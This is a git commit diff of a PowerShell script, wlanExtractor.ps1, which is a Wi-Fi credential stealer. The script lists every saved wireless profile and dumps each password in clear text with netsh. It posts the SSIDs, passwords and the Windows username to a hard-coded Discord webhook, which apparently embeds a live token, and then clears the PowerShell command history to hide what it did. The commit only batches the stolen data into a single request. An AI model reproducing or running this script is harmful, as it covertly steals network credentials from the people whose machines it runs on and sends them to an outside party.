bd09a18e2b701c2f7422c1262e404406d3a41ae0
Rohan O'Dwyer <166503624+rohanod@users.noreply.github.com>
2024-07-14 20:06:19 +0200

    Refactor Invoke-RestMethod URL in wlanExtractor.ps1

--- wlanExtractor.ps1
+++ wlanExtractor.ps1
@@ -1,15 +1,20 @@
 # ENG
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-    $wlan = $_.Matches[0].Value.Trim()
+$allProfiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
+$allContent = ""
+
+foreach ($profile in $allProfiles) {
+    $wlan = $profile.Matches[0].Value.Trim()
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object { $_.Matches[0].Value.Trim() }
 
-    $Body = @{
-        'username' = $env:USERNAME
-        'content'  = "SSID: " + $wlan + " | Password: " + $passw
-    }
-    
-    Invoke-RestMethod -ContentType 'application/json' -Uri 'https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30' -Method Post -Body ($Body | ConvertTo-Json)
+    $allContent += "SSID: " + $wlan + " | Password: " + $passw + "`n"
 }
+
+$Body = @{
+    'username' = $env:USERNAME
+    'content'  = $allContent
+}
+
+Invoke-RestMethod -ContentType 'application/json' -Uri 'https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30' -Method Post -Body ($Body | ConvertTo-Json)
 
 # Clear the PowerShell command history
 Clear-History
